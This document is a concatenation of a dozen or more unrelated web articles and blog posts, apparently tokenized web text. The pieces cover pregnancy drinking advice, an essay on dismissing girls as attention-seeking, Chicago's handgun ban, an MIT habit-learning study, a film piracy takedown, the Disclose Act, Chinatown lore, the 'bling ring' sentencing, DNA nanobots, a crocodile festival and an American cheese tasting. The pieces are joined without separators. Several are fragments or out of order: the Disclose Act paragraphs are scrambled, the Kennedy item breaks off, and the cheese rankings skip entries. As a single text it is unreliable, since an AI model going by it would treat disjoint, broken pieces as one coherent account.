Researchers at the two - day seminar at Kent University will present fresh analysis of the decision to advise pregnant women to avoid any alcohol .
There have been mixed messages about drinking in pregnancy in recent years .
The impact of mounting efforts to involve fathers in the antenatal period will also be explored .
The Changing Parenting Culture conference next week is to explore the emergence of what it sees as new , often contradictory rules shaping pregnancy and pregnancy planning .
These include the role of stress in pregnancy , amid conflicting reports on the impact of the way a mother feels on the wellbeing of the growing foetus .
Some studies have suggested that stress in pregnancy can cause anything from physical abnormalities to behavioural problems .
Elizabeth Mitchell Armstrong , professor of sociology at Princeton University , will argue that maternal emotions are being " medicalised " .
" To the list of pregnancy prescriptions and proscriptions comes another mandate : be happy , be calm .
Pregnant women are exhorted to avoid stress and to moderate their emotions in order to produce a healthy baby .
" Yet the evidence behind this recommendation is exceedingly weak . "
Drinking up
The conference will also look at the issue of Foetal Alcohol Syndrome ( FAS ) and accompanying disorders - the reason why pregnant women are advised to abstain from alcohol in many countries - including the UK , US , France and Australia .
The relationship between sustained heavy drinking in pregnancy and health problems such as growth and mental retardation is well - established - although alcoholic mothers will not necessarily have affected children - but evidence is lacking that low to moderate intake is harmful .
They have decided it is preferable that pregnant women take no risk even if there is no evidence of harm Dr Ellie Lee , University of Kent
However concerns that some women may underestimate their drinking , as well as fears that a lack of evidence did not mean moderate consumption was safe , are thought to have informed the 2007 decision to advise pregnant women in England to abstain .
Dr Ellie Lee , a lecturer in social policy at the University of Kent , suggests that in " advocating abstinence without an evidence base , policy makers formalise a connection between uncertainty and danger " .
She adds : " They have decided it is preferable that pregnant women take no risk even if there is no evidence of harm .
" But there are dangers associated with this approach , not least that such hyper risk - aversion sits uneasily with advice to parents against ' cotton wooling ' or worrying too much about their children 's health .
His and hers
Fathers meanwhile are being increasingly encouraged to curb their drinking , stop smoking and eat well when a partner is pregnant , on the basis that his behaviour is likely to influence hers .
Attendance at ante-natal sessions , as well as the birth , is now widely expected .
But research to be presented by Jonathan Ives and Heather Draper of the Centre for Biomedical Ethics at Birmingham University will question this mantra
They suggest that involving men in the very medicalised aspects of their partner 's pregnancy and labour - where their contribution is inevitably limited - is not necessarily the best preparation for all fathers .
" It 's a good and positive step to promote male involvement , and we are not seeking to undermine that , " says Dr Ives .
" But we are getting to a point where society has to ask if we are going about this the right way .
It 's time for debate . "
" She just wants attention " is a phrase I frequently hear .
It 's in regards to the girl who cut herself , and the girl who was on anti-depressants .
Or the girl ( this girl , actually ) who had anxiety attacks , or the anorexic girl .

All of us were quickly dismissed using that contagious needy - for - attention rationale , and I guess the easiest explanation as to why is simply , well , middle - schoolers suck .
They lack empathy and sympathy , and it 's easy to resort to apathy .
But here 's the thing : entering Social Studies half an hour late into a room of kids who know very well why you were just in the counselor office and still choose to whisper about how you 're probably just PMSing or angry about something girly and stupid like shoes or whatever — it 's really hard to walk into that situation .
You have no choice ( one has to return to class , after all ) , and you continue to feel awful even if you manage to endure it .
( Some people might respond here with a typical anti-feminist slur : that I 'm only writing this to complain about my own problems .
I 'm writing this to try and shed a little light on this situation , as someone who has experienced it , but sees that it is n't uncommon in a world far greater than that of my peer group .
)
When someone shoves aside another person 's issues , they 're saying that that person is putting a personal issue out there just so others will listen .
But is that necessarily wrong ?
A need for attention can also be a call for all kinds of help , and maybe that 's all a person who 's struggling internally wants or needs .
Apathy , for those who dismiss these people , is deliberately remaining passive in an effort to not care ; not taking the time out to tell an adult , not going a bit out of your way to see if the person is all right , not taking a break from your own shit to help someone clean up theirs .
That 's why " she just wants attention " is so easy , and so middle school .

And yet ... it's really not just middle school .
At all .
Unless ... damn , were my teachers right when they said junior high really was preparing me for the real world ?
So , Megan Fox .
People really , really hate Megan Fox .
If you have an Internet connection , you know this , but in case you 've forgotten , here 's a hate - driven Tumblr , the description of which reads : " Fuck you , Megan Fox .
No , really .
Keep your trap shut . "
Megan
Fox is a pretty talkative person .
Wait , no , she 's a pretty talkative woman .
She 's a pretty talkative woman who makes a lot of dudes happy by playing the sexy chick .
And on top of that , she 's talked about how her male boss , Michael Bay , can be kind of a jerk .
And Michael Bay tends to dismiss her " silly " ramblings about how he 's narcissistic and creepy and made her wash his Ferrari wearing a bikini in order to get a part in Transformers .
Which she should apparently be really , really grateful for , since whenever people talk about her , they like to throw in the " do n't bite the hand that feeds you " admonishment .
To which I say , what if that hand is also trying to grab your ass ?
People seem to get pissed that their sex symbols have to come with opinions , and like , emotions , and things to say .
Fox is dismissed by Bay and the media as an attention whore , an egotistical bitch who just wants to find something to complain about so people will look at her .
However , when Shia Labeouf insulted Michael Bay ( and Stephen Spielberg , and George Lucas ) , he was just an honest young man with an old soul .
Fox , you see , is similarly famous but also desired , so she should have nothing to be upset over .
Surely a woman 's needs and problems can't go deeper than that !
She just wants attention .

Middle - schoolers and the media have a lot of difficulty believing that when a woman is upset , it 's honest and real and not an attempt to fish for compliments because , well , why should she have anything to be upset about ?
Or maybe people can see some of the anger or sadness as real — but it 's just so much easier to brush it aside .
Women are just whiny , y'know ?
They 'll get over it .
And so , apathy .
Gender becomes such a vital part of how we judge others , and the idea that a girl 's anger is irrational is instilled , and then the girl with the eating disorder or the girl who cuts herself is ignored or scrutinized for having feelings and wanting help .
It has to be realized that if a woman or girl is upset about something , it 's not just because she wants attention .
And if she does want attention , maybe it 's because she wants care .
Is that something to dismiss ?
What happens when we do dismiss it ?
I 'm not sure I want to know .
Happy birthday Canada … from London !
That ’s right : from France , we took the Eurostar ( more on that later ) and are now in London for a few days .
And this afternoon , we stumbled upon the Canada Day celebrations in London , in Trafalgar Square — a huge ( unexpected ) party !
We had a good laugh when we noticed there were even a Tim Hortons on - site for the occasion , as well as a poutine stall ( £5 though ! ) and a bunch of Canadian flags .
It felt like Parliament Hill , just noisier .
For some reason , techno music was the music of choice — what , no Tragically Hip , the perfect Canadian band ?
Oh right , they are in Ottawa , playing at the BluesFest .

As Chicago awaits a U.S. Supreme Court ruling this month that could overturn its 28 - year - old handgun ban , City Hall is considering a host of countermeasures that might set off another round of legal fights with gun advocates .
In an interview with the Tribune , Mayor Richard Daley acknowledged an uphill battle against the gun industry , which he described as the most powerful lobby in the United States .
Even so , he vowed that in the event residents are allowed to have handguns at home , the city would take steps to ensure that officials can account for the weapons .
The mayor said his primary goal would be to protect police officers , paramedics and emergency workers from being shot when responding to an incident at a home .
He said he also wants to save taxpayers from the financial cost of lawsuits if police shoot someone in the house because the officer felt threatened .
" If the ban is overturned , we will see a lot of common - sense approaches in the city aimed at protecting first responders , " Daley said .
" We have to have some type of registry .
If a first responder goes to an apartment , they need to know if that individual has a gun . "
The city is looking closely at models adopted in Washington , D.C. , after the Supreme Court struck down its handgun ban two years ago and in California , which has some of the most comprehensive gun laws in the nation .
Chicago already requires registration of rifles and shotguns , which are legal in the city , and those regulations could easily be applied to handguns , according to the city 's corporation counsel , Mara Georges .
The city also has the option of rewriting its current ordinance to include stronger , more controversial measures , such as databases that track a gun from the manufacturer to the gun shop to its current owner , and ballistic fingerprinting , which requires manufacturers to test - fire guns and keep a record of the unique ballistic markings left on bullets and shell casings .
Gun control advocates said such requirements can help law enforcement identify guns that are linked to crimes .
But gun rights advocates said such requirements deter law - abiding citizens from obtaining guns and lead to further litigation .
" What cities need to realize is that the 2nd Amendment is a normal part of the Bill of Rights , " said Alan Gura , the lead attorney representing plaintiffs in the case against Chicago being considered by the Supreme Court .
" Laws that can be justified as having a real solid public safety purpose that do n't interfere with people 's rights , those will survive . "
Gura also represented plaintiffs in the District of Columbia lawsuit in 2008 .
Daley said he likes all aspects of the D.C. law and that Chicago could look there for ways to strengthen its licensing procedures .
After its gun ban was overturned , the district adopted stringent requirements for prospective gun owners , including a four - hour class on firearm safety , at least an hour of firing training and passing an exam .
The newly purchased gun also must undergo ballistics identification firing by police .
Next year , the district will require semi-automatic pistols to be micro-stamped , a controversial technique in which serial numbers are marked on cartridge cases that can be traced back to registered gun owners .
California also has adopted a requirement for micro-stamping , a technology that was recently developed and is not yet in use .
New York 's legislature is considering a micro-stamping bill .
The NRA and other gun advocates said such measures could lead to a national database of gun registrations , which they oppose .
And they said much of the new technology is unproven or ineffective .
" The D.C. City Council has made it nearly impossible for people to purchase and register firearms in the district , " said NRA spokeswoman Rachel Parsons .
" That 's stepping on the Supreme Court decision that the 2nd Amendment is an individual right . "
Gun advocates have lawsuits pending across the country challenging laws enacted after the district 's gun ban was struck down .
Two aspects of Chicago 's firearms registration law — that guns be registered before the purchaser takes ownership and that gun owners re-register weapons every year and pay an annual tax — are also being challenged in the gun ban lawsuit .
Attorneys said it is unlikely the Supreme Court will rule on those issues at this time , leaving the city open to further litigation .
Daley , who has made gun control a cornerstone of his administration , said he and other mayors struggle daily with the common philosophy that places too much value on guns and too little emphasis on the consequences of gun ownership .
" What has happened in this nation is we really believe that guns are better than the law to settle things , " the mayor said .
" We 're not talking about hunters and gun collectors , but this whole idea that America should be governed more by guns than by the law .
That really disturbs me . "
The federal government , Daley said , has abdicated its responsibility of regulating interstate commerce in guns and placed that burden on local governments , without giving them leeway to make decisions based on situations in their own communities .
" It 's their responsibility , not ours , " Daley said .
" Guns come here from other states , and we have to figure out how to respond to it . "
The result , he said , is that the gun industry now has " carte blanche " across America .
Juliet Leftwich , legal director for the San Francisco - based Legal Community Against Violence , said Chicago could have a unique opportunity to fill the gaps in federal and state law .
Gun dealers , for example , must have a federal license , but they are only minimally regulated by federal or state law , she said .
Requirements such as background checks for gun store employees , liability insurance and zoning restrictions could help to better regulate gun sales , said Leftwich , whose gun control group helped D.C. rewrite its law and has been in contact with Chicago .
There are no licensed firearms dealers in the city , and such regulations could keep Chicago from seeing an influx of dealers if the handgun ban is overturned , according to Georges .
" Much of the reason gun dealers have n't opened shop is because is because if they were to do so , as soon as someone were to purchase a handgun and take it out of the shop , they would be in violation of the city 's ordinance and subject to arrest , " Georges said .
She said the city could ban firearms dealers altogether or make gun shops subject to extremely tight regulations with requirements such as reporting what kind of guns they are selling and to whom they are selling them , perhaps even requiring such reports daily .
The Supreme Court declined to establish clear standards for regulating guns in the D.C. case , leaving it open to interpretation and further court challenges , legal experts said .
While the Chicago case is expected to establish law on gun bans for every state , no one expects all the regulatory questions to be answered .
" Chicago has a great deal many restrictions already on the books .
It is difficult to see how they could get them much tighter even if they wanted to , " said Gura , the attorney challenging Chicago 's gun ban .
" Hopefully , the city will sit down with the court decision and read it carefully to make sure the city 's laws are constitutional . "

Driving to and from work is a habit for most commuters - we do it without really thinking .
But before our commutes became routine , we had to learn our way through trial - and - error exploration .
A new study out of MIT has found that there are two brain circuits involved with this kind of learning and that the patterns of activity in these circuits evolve as our behaviors become more habitual .
The researchers focused on the basal ganglia , brain structures that are best known for their role in movement control , but which are also involved in emotion , cognition and reward - based learning .
These different functions are thought to reside in different parts of basal ganglia .
The dorsolateral part of the striatum ( the input side of the basal ganglia ) controls movement and is connected to the sensorimotor cortex , while the dorsomedial striatum controls flexible behavior and is connected to higher areas known as association cortex .
But it has not been clear how these distinct circuits contribute to the learning of new behaviors .
Now for first time , researchers at MIT have recorded the activity of these two circuits in rats as they learned to navigate a maze , and found that the circuits have distinct patterns of activity that evolve during the course of learning .
The team led by Ann Graybiel , a MIT Institute Professor and member of the McGovern Institute for Brain Research , recorded the activity of thousands of neurons in the striatum as rats learned to find a cache of chocolate sprinkles at the end of a maze .
As they approached a T - junction in the maze , the rats had to decide whether to turn right or left .
The correct direction was indicated by a sound or a touch cue , the meaning of which the rats had to discover through trial - and - error .
And just like human commuters , the rats performed this over and over again until the correct choice became routine .
As the rats ' performance improved with repetition , the two different striatal circuits showed distinct patterns of activity .
The dorsolateral striatal neurons were most active at the specific action points within the maze ( start , stop , turn etc ) and this pattern became steadily stronger with practice .
The dorsomedial neurons , by contrast , showed highest activity around the decision period -- when the rat experienced the cue and had to decide which way to turn .
These neurons were also most active as the rats were learning , and their activity declined in later trials once the rats had mastered the task .
" We think the two basal ganglionic circuits must work in parallel , " said Catherine Thorn , first author of the study .
" We see what looks like competition between the two circuits until the learned behavior becomes ingrained as a habit . "
" These brain circuits are affected in Parkinson 's disease , substance abuse and many psychiatric disorders , " says Graybiel .
" If we can learn how to tilt the competition in one direction or the other , we might help bring new focus to existing therapies , and possibly aid in the development of new therapies . "
But in terms of every day life , Graybiel adds , " it is good to know that we can train our brains to develop good habits and avoid bad ones . "

Some films were available online hours after their cinema release
US officials have shut down nine websites accused of offering free access to films , including Toy Story 3 .
The crackdown , which included seizing assets from 15 bank accounts , involved police , customs and the movie industry .
The closure of the sites , which had 6.7 m visitors combined each month , was described as the " largest takedown of illegal movie and TV websites in a single action " by the government .
Some films were available hours after their release in US cinemas .
Previous crackdowns on film piracy have focused on illegally copied DVDs .
The latest action is the first of its scale to target websites which profit - by selling advertising or taking donations - from offering pirated films for free .
Website warning
Search warrants were executed in New Jersey , New York , North Carolina and Washington in an investigation which involved about 100 agents in 11 US states as well as the Netherlands
Websites targeted had links to films including Knight and Day , Jonah Hex and Prince of Persia : The Sands of Time - all currently showing in US cinemas .
If a site reappears , so will we .
If the criminals move overseas , we will follow John Morton , Immigration and Customs Enforcement
A warning placed on the websites state they have been seized by officials .
The government has only seized domain names which means computers running the sites could be used with different URLs .
John Morton , of Immigration and Customs Enforcement , said : " If a site reappears , so will we .
" If the criminals move overseas , we will follow .
" Take it from me , I do n't think that we 've stopped internet piracy in a day but this is going to be a sustained effort . "
Officials say that further actions , including possible prison terms , are expected against website operators .
George Steinbrenner was always depicted on Seinfeld , I think it helped make him an icon among people who were n't baseball fans .
So I found of some of the best moments , including this cameo of George when he actually came on the show .
George Steinbrenner Cameo :
And here are some of the other moments from George Steinbrenner " The Character " :
Calzone
George is Crazy
The Nap
Hideki Irabu
Jay Buhner
I could n't embed this last one , it is the one where Steinbrenner thinks George Costanza is dead , and goes to his parents house .
And Mr. Costanza yells at Steinbrenner about Jay Buhner .
Classic .
It would expand the window for " electioneering communications , " which was 30 to 60 days under McCain - Feingold , to 90 days before a primary or caucus .
During that period , corporations and nonprofits would face stringent procedures for any corporate advertising .
The electioneering window , once opened , would continue through to the general election .
So because presidential primaries fall well before the election , the restrictions could conceivably be in place for over a year .
The bill requires a mountain of paperwork , because companies must submit a list to the FEC of all donors who contributed more than $ 600 .
" In the 1950s , the NAACP went to court to say it should not have to disclose its membership list , " Heritage Foundation legal scholar Hans Von Spakovsky says .
He contends the provision to disclose members ' names poses constitutional problems " because it interferes with their right to associate . "
It prohibits any company that received government contracts , or that received TARP bailouts , from spending any money on election advertising .
In a precedent - setting exemption , the Disclose Act for the first time would restrict the activities of nonprofits and companies , but not unions in some cases .
Opponents point out that unions recently spent over $ 10 million in an unsuccessful bid to defeat Arkansas Sen. Blanche Lincoln in the Democratic primary .
" This is the empower - labor - unions - over - everybody - else act , " says Norquist .
" It 's making it illegal for Americans to participate in politics . "
It bans any advertising from foreign companies , including domestic companies that have 20 percent or more foreign control .
The names of all donors who give $ 1,000 or more to an organization must be disclosed to the FEC , if the organization spends more than $ 10,000 on political advertising .
Labor unions are included in this provision .
It requires CEOs to appear on camera stating they " approve this message . "
Those familiar with how political fundraising work say this alone would scare away political speech by the vast majority of companies and associations .
Curt Levey of the Committee for Justice , one of the groups that signed the anti-Disclose Act letter , tells Newsmax : " I see this as a threat especially to conservative nonprofits , but really to nonprofits in general , because that 's ultimately where the corporate spending that is being attacked here is coming from .
Donors very often ask about anonymity .
That 's important to them .
I could see the groups losing a lot of donations .
It 's meant to have a chilling effect , and it will have a chilling effect .
I think it 's going to have a horrible effect on nonprofits groups . "
The top donor to the organization , who might not have donated any money for that particular ad , would be required to appear in the commercial to provide the public with information on those funding the commercial .
Also , a TV ad would have to list the top five funders to the organization , and radio ads would have to disclose the top two funders .
Disclose
Act opponents point out the additional time required for the burdensome disclosures would make the ads prohibitively expensive .
Republicans are mounting a last ditch - effort to stop Democrats from pushing through a controversial bill intended to roll back a recent Supreme Court decision by restricting companies ' and associations ' political advertising .
Euphemistically called the Democracy is Strengthened by Casting Light on Spending in Election ( Disclose ) Act , the bill is expected to come to the House floor as early as Wednesday .
On Monday , Democratic leaders cleared the bill 's way by cutting a deal with the NRA , exempting the massive gun-rights organization from the act 's requirements .
Democrats in moderate districts were wary of crossing the NRA by trying to limit its campaign ads .
Democratic leaders now are confident they can push the bill , H.R. 5175 , through the House without difficulty .
Americans for Tax Reform founder Grover Norquist , who opposes the act , says House Republicans probably can't stop it .
" It will pass the House , " he tells Newsmax , " but it probably wo n't pass the Senate .
" Americans for Tax Reform and more than 50 other groups , including The American Conservative Union , CatholicVote.org , the Center for Competitive Politics , and Citizens Against Government Waste , have sent a letter to Congress calling the bill " an unequivocal ban on free speech , masquerading as an exercise in accountability .
" The controversy stems from the Supreme Court 's recent Citizens United v. FEC ruling .
In that case , the high court ruled that provisions of the McCain - Feingold campaign finance law , which severely restricted the rights of corporations and nonprofit groups to run political advertising , were unconstitutional .
Democrats soon vowed to enact legislation rolling back that decision .
During President Obama 's State of the Union address , he publicly scolded the Supreme Court for its verdict in Citizens United v. FEC , alleging that it would " open the floodgates for special interests , including foreign corporations , to spend without limit in our elections .
" What Obama did not mention is that a separate federal law , unrelated to McCain - Feingold , already prohibits the expenditure of funds by foreign nationals and foreign companies to influence U.S. elections .
The U.S. Chamber of Commerce has voiced strong opposition to H.R. 5175 , which requires disclosure of the major corporate donors to a nonprofit that airs a political commercial .
The chamber recently blasted the bill as " unconstitutional , " calling it a " desperate attempt " of Democrats to grab a political advantage in the upcoming midterm elections .
Among the bill 's controversial provisions : Another opponent of the bill , Mark Fitzgibbons , president of corporate and legal affairs for Richard Viguerie 's conservative American Target Advertising , says the act is rife with many intentional loopholes and exceptions .
Members of Congress , for example , who receive donations from corporate PACs , are still able to donate that money directly to their parties ' election coffers .
Politico reported Monday that nine Democratic incumbents have funneled $ 50 million in this election cycle to the Democratic Congressional Campaign Committee .
"
That 's far more secretive and corruptive … and helps explain why Democrats are the kings of crony capitalism , getting more money from BP , Goldman Sachs , Fannie Mae and so on , " Fitzgibbons tells Newsmax .
Democrats are promoting the bill as a way to disclose to the American people those who are really behind the political advertising the public is exposed to .
But the bill 's proponents have openly touted it as a way to tighten the spigot on corporate speech related to campaigns — the precise impulse that the Supreme Court already has ruled was unconstitutional .
" The deterrent effect should not be underestimated , " Schumer said when the New York Democrat rolled out the bill .
Norquist said Monday he is " very disappointed " the NRA cut a separate deal with House leaders , rather than stand with conservatives on principle .
The legislation also apparently would not affect Citizens United , the organization whose court case started the whole controversy .
That 's because the FEC ruled Monday that Citizens United would qualify for the " press exemption " written into the 1971 Federal Election Campaign
Act to avoid improperly restricting media activities during an election .
Norquist believes Republicans opposed to the bill will have to make their stand in the Senate .
" We hear they have 41 against in the Senate , " Norquist tells Newsmax .
" We need all hands on deck to make sure Republicans hold in the Senate .
The bill is a disaster , but hopefully the Republicans in the Senate will stop it . "
From early on in his four - decade career in the senate , Edward Kennedy , the youngest of the three brothers , was known for his affairs with women and extravagant drinking habits .
Papers released earlier this year the library of former president Richard Nixon showed that in the early 1970s he discussed with the aides the possibility of discrediting Kennedy by leaking news of his infidelities .

Back in the 1930s , Chinatowns had acquired a reputation for drugs , prostitution , and gang violence that was largely undeserved .
Tired of trying to fight for their good name , many residents decided to play into the stereotypes and make some money .
In San Francisco , Chinatown tour guides spun tales of underground tunnels filled with opium dens and sex slaves .
They even set up a few fake dens and leper colonies .
Meanwhile , tour guides in New York went so far as to hire locals to put on knife fights between opium - crazed men over ownership of prostitutes .
Suddenly , visitors who had " seen it firsthand " were spreading legends about Chinatowns ' debauchery .
Ironically , violence and crime rates were on the decline in Chinatowns during this same period .
In the early days of San Francisco , wealthy residents would ship their dirty laundry to Hawaii because there were no cleaning services in California .
But that changed in 1851 , when a Chinatown resident named Wah Lee opened the first Chinese laundry in the United States .
It flourished , and so did the many others like it that followed .
In fact , the success of Chinese laundries allowed immigrants to move east , establishing new Chinatowns across America .
( Image credit : Flickr user loop oh )
Traditional Chinese culture , dominated by the teachings of Confucious , valued scholars and intellectuals above all other members of society .
In fact , the pursuit of financial gain was seen as a lowly one .
That 's why so many Chinese entrepreneurs and tradesmen flocked to the United States , where the dollar was king .
Although Chinatowns exist all over the world , none is more puzzling than the Chinatown in Shanghai .
You 'd think a Chinese city would n't need a Chinatown , but Shanghai is relatively young , and much of the architecture is modern .
So city officials have set aside an area to pay tribute to their heritage - a quaint section of town with traditional buildings and services .
One of the most popular dishes on Chinese menus was n't inspired by a chef in China , but rather by a garbage bin in the United States .
According to legend , a bunch of drunk white miners stumbled into a Chinese diner just as the restaurant was about to close .
Undaunted , the men demanded service .
The owner , hoping to avoid trouble , ordered his cook to quickly gather table scraps of vegetables , meat , and gravy and stir - fry them .
The men loved it , and soon patrons were clamoring for more " Chop Suey " .

Los Angeles , California ( CNN ) -- Reality TV personality Alexis Neiers was sentenced to 180 days in jail Monday for her role in the " bling ring " burglaries of celebrity homes in the Hollywood , California , area .
Neiers , 18 , wiped away tears after entering a no - contest plea to a single felony charge of burglarizing the home of actor Orlando Bloom last July .
Without the plea deal , Neiers could have faced six years in prison for the burglary , the prosecutor said .
She also avoids charges on other burglaries tied to the ring , including break - ins at the homes of Lindsay Lohan and Paris Hilton .
Los Angeles County Superior Court Judge Peter Espinoza imposed the plea - bargained sentence that included the jail term , three years probation , a two - year suspended prison sentence and restitution to be determined later .
Neiers must start her 180 days in the county jail on June 24 , he said .
A Los Angeles police detective testified at a preliminary hearing in December that Neiers was one of four people caught by a security video camera carrying bags out of Bloom 's Hollywood Hills home in the early morning hours of July 13 .
Property belonging to actresses Lohan and Rachel Bilson was found at Neiers home , the detective said .
More than $ 3 million in stolen property was recovered from another alleged burglar , police said .
One of the suspects told investigators they used online gossip sites to track where celebrities lived and when they would not be home , according to court documents .
The E ! cable network was producing a reality series about Neiers and her family when she was arrested last year .
Instead of interrupting the show , " Pretty Wild " included the real - life drama in its story line .

It may look like some diagrams and a few blobs , but what you 're seeing here is nothing short of a nanotech revolution .
Four nanorobots made of DNA are interacting on an " assembly line " in order to build a tiny device .

Today in Nature , a group of researchers announced they 'd successfully operated the first assembly line populated entirely by nanobots .
The bots in question are molecular machines made from strands of DNA , and each one has four " feet " that walk on a specially - prepared surface covered in chemicals that direct the bot 's motion .
It also has three " arms " to carry cargo - in this case various sizes of gold particles .
These gold particles can bind together into eight different products .
In their experiment , the scientists succeeded in guiding a nanobot to pick up the three gold particles , each held by other bots .
It walked up to each bot , grabbed the gold cargo , and moved on to the next bot to do the same thing .

On the left in the drawing above , you can see a diagram showing what 's going on ( click to enlarge ) , whereas on the right you can see an atomic force micrograph of the pieces of gold being gathered by the nanobot ( you ca n't actually see the nanobot ) .
Here 's what the scientists say is happening in the picture :

A release from Nature explains :
Nadrian Seeman and colleagues create a nanoscale ‘ assembly line ' , in which DNA walkers move past programmable DNA machines that can deliver ‘ cargo ' ( gold nanoparticles ) to the walkers .
In addition to four ‘ legs ' , the DNA walkers have three ‘ hands ' that accept the cargo .
The assembly line has three DNA machines , each of which holds a different type of cargo , and can be set either to transfer its cargo to the walker , or to withhold it .
In this way , the nano - assembler can be programmed to produce eight ( 23 ) different ‘ products ' , all with usefully high yields .
[ University of Wisconsin chemist ]
Lloyd Smith notes that the assembly line of Seeman and colleagues marks a milestone in DNA nanotechnology , in using ‘ systems of nanomachines , rather than individual devices ' to perform an operation .

Father dangles baby son above crocodile 's jaws during religious festival
As he dangles his writhing baby over the open jaws of a hungry - looking crocodile , you would be forgiven for thinking this man had lost his mind .
But there is method in his madness , for he is a Sheedi devotee seeking blessings for his five - month - old son .
The terrifying event is part of an annual spiritual festival in Karachi , which sees a community of African - descended Pakistanis appease the crocodile – which is regarded as sacred .
Do n't slip !
A Sheedi devotee seeks blessings for his five - month - old son while holding him over a crocodile at the Manghopir shrine in Karachi today
Dinner time : Offerings of fresh goat meat are also made to the reptiles , who are regarded as sacred
During the Sheedi Mela , devotees make pledges to a shrine for the reptiles and then head for the water to offer them fresh goat meat .
Acceptance of the meat is regarded as a sign of luck and property and the faithful believe the beasts wo n’t attack because they are the disciples of the saint , Khwaja Hasan .
The festival begins with a procession of girls who carry dishes of meats and sweets to the crocodile shrine , while Sheedi elders offer prayers and devotees dance in bare feet .
Party time :
The annual festival sees singing and dancing to drum rhythms
Crocodiles are so revered in the community that they are buried with the same respect as human beings .
The animals are bathed and wrapped in burial shrouds before being buried in a specially - designated graveyard .

It 's no secret that we here at AHT love our American cheese .
Nothing else has the same melty , gooey texture and milky , salty flavor that accentuates , but does n't compete with a burger .
Of course we realize that it's a stretch to even call the stuff " cheese , " but if New York Mag 's Approval Matrix has told us anything , it 's that we 're anything but high brow , and that 's perfectly fine by me .
But the question is , which American cheese is the gooey , melty , milky , salty , cheez -y best ?
This week we cooked over 40 burgers and grilled cheese sandwiches with ten different brands of American cheese to find out .
The Set - up
All cheese were tasted completely blind in two forms : on top of a griddled 100 % brisket burger on a toasted Martin 's Potato Roll ( no condiments allowed ) , and as a double stack inside a Wonderbread grilled cheese sandwich .
Tasters were asked to rank the cheese based on flavor , meltability , and overall impression .
Despite their mannerly appearance to the outside world , SE - ers are surprisingly bad at taking direction .
Strict protocols were put in place and several spankings were administered to ensure that tasting sheets were completely filled out in a timely and orderly manner .
Meltability
For the most part , the meltability of a cheese came down to one factor : the ingredients list :
The top is the typical ingredients list from a " Cheese Product , " a term that is only vaguely defined , and is not restricted by the government .
Most " cheese products " are thus labeled because they bulk up their real milk with a large amount of " Milk Protein Concentrate " — a much cheaper ingredient than real milk or real cheese , and one that is not allowed in any product labeled " American Cheese " according to the FDA .
The photo below demonstrates the range of meltability we found within our tasting :
Real " American Cheese , " like Kraft Deli Deluxe slices must be made up of at least 51 % actual cheese ( hence , " cheese " will always be the first ingredient on the label ) .
It has a distinctly higher melting temperature ( i.e. it stays solid longer ) than " Cheese Products " , and this makes sense .
Cheese products contain a higher percentage of milk proteins , along with a few emulsifiers in there that help them stay softer and melt at a lower temperature .
Their first ingredient is usually " milk . "
For the most part , during cooking , the meltier the cheese , the more appetizing the sandwiches looked .
However , the absolute gooiest of the bunch , Kraft 's Velveeta slices — which are bound with gelatin — melted to a nearly completely liquid state as the cooked , saturating the bread and oozing out onto the griddle .
At the opposite end of the spectrum , the two organic cheeses made by Wholesome Valley failed to melt in the slightest , remaining solid , and even crumbly after being fully cooked , as the grilled cheese in the photo below can attest to .
Obviously , there 's something wrong with that picture , and it ai n't the bread .
Flavor
As far as flavor is concerned , they ranged from super salty and bland , to mildly salty and bland .
Flavor is not American cheese 's strong point — nobody ever claimed it was .
So it 's not surprising that it did n't factor heavily into people 's overall rankings .
The Tasting Results
Surprisingly , for both the burgers and the grilled cheese sandwiches , the overall rankings remained pretty much the same , with a tiny bit of flip - flopping near the top end .
And none of the cheeses outside of the bottom two were deemed unacceptable .
Our conjecture about American cheese being all about the goo factor was pretty much correct — overall , the cheeses that melted the best scored the best in our tastings , although lack of flavor did downgrade a couple of the best melters ( notably Velveeta ) .
It turns out that the more wholesome sounding " American Cheese " ( Deli Deluxe and Hotel Bar ) held no significant advantages over the " Prepared Cheese Products , " despite having real cheese as the first item in their ingredients lists .
In the end , they were downgraded for their inferior melting qualities .
In the end , the most remarkable part of the tasting was how remarkably similar all the cheeses .
In reality , as long as you stay away from the Wholesome Valley brand , you should be pretty safe with whatever you choose to top your patty with .
Here are the cheeses , in order of preference .
1. Super A
This generic store - bought brand was deemed the meltiest ( see the burger above ) .
Perhaps because it contained close to the least amount of real cheese ?
The predominant flavors were milky and salty , which seems to be what American cheese is all about .

The ones we grew up with , and they still taste just the same .
In a grilled cheese it stretches and oozes without becoming totally liquid and soaking into the bread .
On a burger is drapes the whole patty in a gooey sheath .

The only cheese product which includes gelatin in its recipe .
It melts to an almost liquid consistency — too gooey by some standards .
In both the grilled cheese and burger , the cheese melted right into the bread , which some tasters loved , but others were confused by .
It was the least flavorful , but its sheer goo factor seemed to make up for it .

A great meltability and strong milkiness put this one firmly towards the top of the pack .

5. Horizon Organic
With only 6 ingredients ( compared to Velveeta 's 16 ) , it was the most " natural " sounding of the bunch .
But those emulsifiers must be there for a reason , because it was also one of the least meltiest , turning waxy a few seconds after biting into the sandwiches .
A good strong , almost cheddar - like flavor helped .

7. Kraft Deli Deluxe
Deli Deluxe is Kraft 's premium offering , and it 's actually a real American cheese , as opposed to a cheese product .
Ed wanted so badly for this one to win , but in the end the real cheese did n't improve its flavor enough to compensate for its relative lack of meltability .

Before hearing from a Lane Bryant employee on what she thinks about the recent controversy over her company ’s overtly sexy ad featuring a non-emaciated model in a bra is really about , do me a favor : Name a beloved fat male celebrity .
Jack Black , Jonah Hill , Ruben Studdard , Santa !
Now , how about a fat female celebrity ?
I wo n’t even ask that she be “ beloved . ” Rosie O’Donnell , Roseanne Barr , the ever shrinking / expanding Oprah , Kirstie Alley ?
One of these groups is not like the other .
The fat male group is more loved , less judged for their body size and more contemporary ; the fat female group has many members framed as being “ bitchy ” and “ too opinionated , ” is judged endlessly in relation to body size and is much less current in the zeitgeist ( Gossip singer Beth Ditto is arguably a contemporary fat female icon , but hardly as well - known as the likes of Black ) .
Underneath the brouhaha over whether ABC declined to air the Lane Bryant ad for discriminatory reasons or not lies the pervasive cultural hatred of fat female bodies .
The overt sexualization of women in almost all ads is problematic–even when the ad is attempting to reclaim the fat body as beautiful–but in this case other issues are in play .
As pointed out by blogger Artemis Rage , “ Fat people need clothing too ! ”
But there is a definite “ size segregation ” in many clothing stores , which makes stores like Lane Bryant , dedicated to woman above size 12 , a welcome relief .
She writes :
It ’s comforting to me to when I can walk into a store and not feel ashamed for my body size because they do n’t carry it , or barely do .
Yet , she bemoans the fact that Lane Bryant and other such stores are labeled as “ plus size ” while there is no ancillary label for stores stocking sizes 0 to 12 .
